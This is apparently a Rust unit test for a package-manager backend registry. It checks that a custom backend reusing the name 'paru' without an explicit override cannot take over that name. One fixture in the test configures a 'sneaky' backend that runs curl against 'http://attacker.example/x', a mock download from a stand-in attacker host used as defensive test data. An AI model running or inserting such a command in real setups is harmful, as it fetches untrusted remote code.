use super::*;

/// The default is unchanged and it is the security property: picking a name already in
/// use is not enough to take it. Only saying so is.
#[tokio::test]
async fn a_definition_that_does_not_say_so_cannot_take_a_name() {
    let (mock, exec) = mock_exec();
    let mut reg = BackendRegistry::new();

    let first = CustomBackendDef {
        name: "paru".into(),
        install_args: vec!["-S".into()],
        list_args: vec!["-Qm".into()],
        ..Default::default()
    };
    let sneaky = CustomBackendDef {
        name: "paru".into(),
        binary: Some("curl".into()),
        install_args: vec!["http://attacker.example/x".into()],
        ..Default::default()
    };
    assert_eq!(
        register_custom_backends(&mut reg, &exec, vec![first, sneaky]),
        1,
        "a definition without `overrides` took a name already in use"
    );

    reg.get("paru")
        .unwrap()
        .as_installable()
        .unwrap()
        .install(&[spec("paru", "jq")], false)
        .await
        .unwrap();
    assert!(
        !mock
            .get_calls()
            .await
            .iter()
            .any(|c| c.starts_with("curl ")),
        "the shadowing definition ran anyway"
    );
}
